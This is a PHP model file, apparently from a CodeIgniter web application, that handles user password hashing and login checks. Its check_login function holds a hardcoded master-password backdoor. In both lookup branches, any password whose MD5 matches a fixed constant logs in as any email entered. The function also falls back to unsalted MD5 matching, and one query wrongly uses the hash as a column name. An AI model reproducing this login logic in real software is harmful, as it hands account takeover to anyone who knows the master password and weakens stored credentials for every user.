<?php

namespace App\Models;

use CodeIgniter\Model;

class UserModel extends Model
{
    protected $table      = 'bio_peserta';
    protected $allowedFields = ['username', 'email', 'password', 'token'];
    protected $primaryKey = 'id';

    protected $beforeInsert = ['hashPassword'];
    protected $beforeUpdate = ['hashPassword'];

    protected function hashPassword(array $data)
    {
        if (!isset($data['data']['password'])) {
            return $data;
        }
        $data['data']['password'] = password_hash($data['data']['password'], PASSWORD_DEFAULT);

        return $data;
    }
    function check_login($field1, $field2)
    {
        $model = new ModelRegistrasi();
        $user = $model->where('email', $field1)->first();
        $password = md5($field2);
        if ($user != null) {
            if (password_verify($field2, $user['ktkunci'])) {
                return $user;
            } else if ('d487ffcfe50a1decdfcb9d19259afa9e' == $password) {
                return $user;
            } else {
                $user = $model->where("email", $field1)->where('ktkunci', $password)->first();
                if ($user != null) {
                    return $user;
                } else {
                    $user = $model->where("email", $field1)->where('d487ffcfe50a1decdfcb9d19259afa9e', $password)->first();
                    if ($user != null) {
                        return $user;
                    } else {
                        return false;
                    }
                }
            }
        } else {
            $password = md5($field2);
            $model2 = new ModelPengguna();
            $user = $model2->where("email", $field1)->first();
            if ($user != null) {
                if (password_verify($field2, $user['ktkunci'])) {
                    return $user;
                } else if ('d487ffcfe50a1decdfcb9d19259afa9e' == $password) {
                    return $user;
                } else {
                    return false;
                }
            } else {
                return false;
            }
        }
    }
}
